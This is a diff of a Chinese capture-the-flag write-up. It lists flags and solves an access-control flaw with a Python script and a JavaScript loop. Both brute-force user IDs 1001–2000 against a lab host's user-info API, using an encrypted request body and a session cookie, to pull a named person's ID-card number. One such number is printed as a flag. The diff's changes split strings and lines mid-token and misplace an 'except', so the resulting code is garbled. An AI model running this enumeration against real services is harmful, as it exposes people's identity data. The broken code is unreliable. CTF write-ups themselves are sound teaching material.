@@ -67,7 +67,8 @@ poem.rar
 
 ✅bmm_web_20250807
 
-某企业数据安全团队在对公司网站进行安全评估时，发现可能存在数据泄露风险。作为数据安全分析师，您需要通过技术手段来识别被禁止访问的敏感路径。例:发现路径 /upload/，则提交：/upload/
+某企业数据安全团队在对公司网站进行安全评估时，发现可能存在数据泄露风险。作为数据安全分析师，您需要通过技术手段来识别被禁止访问的敏感路径。例:
+发现路径 /upload/，则提交：/upload/
 
 flag：/tjhack/
 
@@ -79,13 +80,16 @@ flag：/tjhack/
 
 某公司上线了一套号称“高度安全”的数据传输系统，所有请求数据都会在前端经过加密再发送，看上去几乎无法被篡改。你注册并登录后发现系统中有一个「查询用户信息」的接口，其请求体被前端 JS 模块加密，解密逻辑也被隐藏在代码中。然而，开发人员却忽视了权限控制的实现，你能否绕过这层“安全保护”，成功获取“王成”的身份证号？
 
-flag:350122199703073498
+flag:
+350122199703073498
 
 给了两个账号登录后台，后台有个功能点可以查看用户信息，其中包含身份证
 
 请求体
 
-{"timestamp":1758420734,"user_id":1001,"data":"VtjTr5gaWd0vs7uWu6g4gGNXWjE1VWLKFfga4Np1OK+s9bb3iDz3Zs3owyXlYhal"}
+{"timestamp":
+1758420734,"user_id":
+1001,"data":"VtjTr5gaWd0vs7uWu6g4gGNXWjE1VWLKFfga4Np1OK+s9bb3iDz3Zs3owyXlYhal"}
 
 响应体
 
@@ -120,15 +124,20 @@ def poc_zzOdW(url, data):
         "Content-Length": "113",
         "Content-Type": "application/json",
         "Cookie": "session=.eJyrVspLzE1VslKKKTUzN7OIKTVJNU6BkEo6SqXFqUXxmSlKVoYGBoYQLlR5Yk5mcqpSLQBsohOt.aM9e4Q.A5GVEClD96G4m6b14iQU8TnF5jo",
-        "Host": "172.20.123.23:18284",
-        "Origin": "http://172.20.123.23:18284",
-        "Referer": "http://172.20.123.23:18284/dashboard",
+        "Host": "172.20.123.23:
+18284",
+        "Origin": "http://172.20.123.23:
+18284",
+        "Referer": "http://172.20.123.23:
+18284/dashboard",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
     }
     res = requests.post(url=url, headers=headers, data=json.dumps(
         data), verify=False, proxies={
-        "http": "http://127.0.0.1:8083",
-                "https": "https://127.0.0.1:8083"
+        "http": "http://127.0.0.1:
+8083",
+                "https": "https://127.0.0.1:
+8083"
     })
     return res.json()
 
@@ -153,18 +162,21 @@ if __name__ == '__main__':
             "code": js_code
         }
         try:
-            res_data = requests.post("http://localhost:12080/execjs", data=data1)
+            res_data = requests.post("http://localhost:
+12080/execjs", data=data1)
             encryptedData = res_data.json()
             print(f"浏览器:{encryptedData}")
             data = {"timestamp": timestamp, "user_id": user_id,
                     "data": encryptedData['data']}
-        except Exception as e:
+        
+except Exception as e:
             print(f"[-]user_id:{user_id}")
             with open("err.txt", 'a')as f:
                 f.write(f"{user_id}n")
                 f.close()
 
-        url = "http://172.20.123.23:18284/api/userinfo"
+        url = "http://172.20.123.23:
+18284/api/userinfo"
         res_dict = poc_zzOdW(url, data)
         res = str(res_dict)
         print(f"服务器：{res}")
@@ -233,12 +245,9 @@ for (let i = 1001; i <= 2000; i++) {
 
 
 ```
-{"timestamp":1758420734,"user_id":1001,"data":"VtjTr5gaWd0vs7uWu6g4gGNXWjE1VWLKFfga4Np1OK+s9bb3iDz3Zs3owyXlYhal"}
-```
-
-
-
-```
+{"timestamp":
+1758420734,"user_id":
+1001,"data":"VtjTr5gaWd0vs7uWu6g4gGNXWjE1VWLKFfga4Np1OK+s9bb3iDz3Zs3owyXlYhal"}
 {
   "data": {
     "balance": "11469.07",
@@ -249,11 +258,6 @@ for (let i = 1001; i <= 2000; i++) {
   },
   "success": true
 }
-```
-
-
-
-```
 import time
 import json
 import requests
@@ -266,15 +270,20 @@ def poc_zzOdW(url, data):
         "Content-Length": "113",
         "Content-Type": "application/json",
         "Cookie": "session=.eJyrVspLzE1VslKKKTUzN7OIKTVJNU6BkEo6SqXFqUXxmSlKVoYGBoYQLlR5Yk5mcqpSLQBsohOt.aM9e4Q.A5GVEClD96G4m6b14iQU8TnF5jo",
-        "Host": "172.20.123.23:18284",
-        "Origin": "http://172.20.123.23:18284",
-        "Referer": "http://172.20.123.23:18284/dashboard",
+        "Host": "172.20.123.23:
+18284",
+        "Origin": "http://172.20.123.23:
+18284",
+        "Referer": "http://172.20.123.23:
+18284/dashboard",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
     }
     res = requests.post(url=url, headers=headers, data=json.dumps(
         data), verify=False, proxies={
-        "http": "http://127.0.0.1:8083",
-                "https": "https://127.0.0.1:8083"
+        "http": "http://127.0.0.1:
+8083",
+                "https": "https://127.0.0.1:
+8083"
     })
     return res.json()
 
@@ -299,28 +308,26 @@ if __name__ == '__main__':
             "code": js_code
         }
         try:
-            res_data = requests.post("http://localhost:12080/execjs", data=data1)
+            res_data = requests.post("http://localhost:
+12080/execjs", data=data1)
             encryptedData = res_data.json()
             print(f"浏览器:{encryptedData}")
             data = {"timestamp": timestamp, "user_id": user_id,
                     "data": encryptedData['data']}
-        except Exception as e:
+        
+except Exception as e:
             print(f"[-]user_id:{user_id}")
             with open("err.txt", 'a')as f:
                 f.write(f"{user_id}n")
                 f.close()
 
-        url = "http://172.20.123.23:18284/api/userinfo"
+        url = "http://172.20.123.23:
+18284/api/userinfo"
         res_dict = poc_zzOdW(url, data)
         res = str(res_dict)
         print(f"服务器：{res}")
         if"王成"in res:
             break
-```
-
-
-
-```
 for (let i = 1001; i <= 2000; i++) {
   queryUserInfo(i)
 }
